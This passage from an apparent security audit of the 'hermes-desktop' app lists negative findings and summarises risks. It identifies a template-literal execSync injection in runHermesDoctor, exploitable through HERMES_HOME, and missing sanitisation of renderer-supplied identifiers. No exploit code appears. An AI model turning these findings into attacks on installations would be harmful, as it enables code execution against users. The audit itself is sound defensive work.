- No `appendFileSync` to user-controlled paths (only `config.yaml` and `gateway.pid` — internal paths).
- No raw user input flowing into `cwd:` of any spawn.
- No `.env` file written with permissions wider than the umask default (no `chmodSync` on env files).
- No `setuid`/`setgid` invocations, no `process.setuid` calls.
- No reflected stack traces sent to the renderer (errors are stringified via `.message` only).

---

## Summary

The hermes-desktop main process is mostly disciplined about `child_process` usage — almost every call uses `execFile`/`execFileSync` with explicit argv arrays, and the askpass design keeps the sudo password out of argv, env, and logs. Two structural issues drive the bulk of the residual risk:

1. **One stray `execSync` with template-literal interpolation** (`runHermesDoctor`, SP-001) is a real RCE primitive when `HERMES_HOME` is attacker-controlled at process launch. Fixing it is a one-line change.
2. **No allow-list / sanitisation on user-controlled identifiers** (profile names, skill IDs, archive paths, log line counts, profile names used in `path.join`) lets a compromised renderer drive privileged CLI behaviour even though the shell-metacharacter problem is avoided by `execFile`. The Hermes Python CLI's own argparse is the second line of defence; that is too thin a margin.

After SP-001, SP-002, SP-003, SP-004, and SP-005 are fixed, the remaining items are defence-in-depth tightening (PATH ordering, env whitelisting, file locking, process-lifecycle hardening).
